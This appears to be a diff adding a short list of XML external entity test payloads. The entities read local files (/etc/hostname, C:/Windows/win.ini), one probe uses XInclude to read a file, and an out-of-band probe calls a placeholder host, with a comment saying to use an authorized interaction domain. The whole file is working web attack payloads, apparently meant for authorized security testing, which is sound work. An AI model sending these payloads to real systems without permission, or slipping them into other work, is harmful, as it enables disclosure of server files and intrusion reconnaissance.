@@ -1,0 +1,15 @@
+# Local-file parser confirmation
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
+<r>&x;</r>
+
+# Windows local-file confirmation
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]>
+<r>&x;</r>
+
+# XInclude confirmation
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>
+
+# OOB detection: replace example.invalid with your authorized interaction domain
+<!DOCTYPE r [<!ENTITY x SYSTEM "http://example.invalid/xxe-test">]><r>&x;</r>
